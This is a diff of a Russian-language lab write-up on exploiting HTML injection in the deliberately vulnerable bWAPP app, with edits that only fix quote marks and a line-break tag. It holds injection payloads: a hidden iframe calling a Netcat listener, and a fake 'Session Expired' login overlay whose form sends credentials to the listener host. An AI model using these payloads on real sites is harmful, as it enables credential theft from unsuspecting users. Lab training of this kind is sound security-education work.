@@ -8,7 +8,7 @@ sidebar_position: 1
 **low**
 
 
-Поднимаем bWAPP и запускаем Netcat и слушаем порт 8082 (в настройках прокси в браузере выставляем ip 127.0.0.1 и 8082 порт). В поле ввода на bwapp водим «**<div class=»code»><iframe SRC=»http://10.0.2.15:8080/blah» height=»0″ width=»0″></iframe></div>**»
+Поднимаем bWAPP и запускаем Netcat и слушаем порт 8082 (в настройках прокси в браузере выставляем ip 127.0.0.1 и 8082 порт). В поле ввода на bwapp водим "**<div class="code"><iframe SRC="http://10.0.2.15:8080/blah" height="0″ width="0″></iframe></div>**"
 
 Переходим в терминал и видим полученную информацию. теперь мы знаем, что на данной странице существует уязвимость HTML Ingection (рис 1).
 
@@ -21,7 +21,7 @@ sidebar_position: 1
 
 **<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color: white;">**
 
-**Session Expired, Please Login:<br>**
+**Session Expired, Please Login:<br />**
 
 **<form name="login" action="http://10.0.2.15:8082/lol.htm" method="GET">**
 
